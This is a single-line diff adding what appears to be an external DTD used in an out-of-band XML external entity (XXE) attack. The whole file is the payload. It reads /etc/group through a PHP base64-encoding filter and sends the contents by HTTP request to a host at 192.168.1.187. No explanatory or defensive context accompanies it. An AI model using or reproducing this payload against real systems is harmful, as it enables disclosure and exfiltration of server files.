@@ -1,0 +1,1 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/group"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.187/?file=%file;'>"> %eval; %exfil;
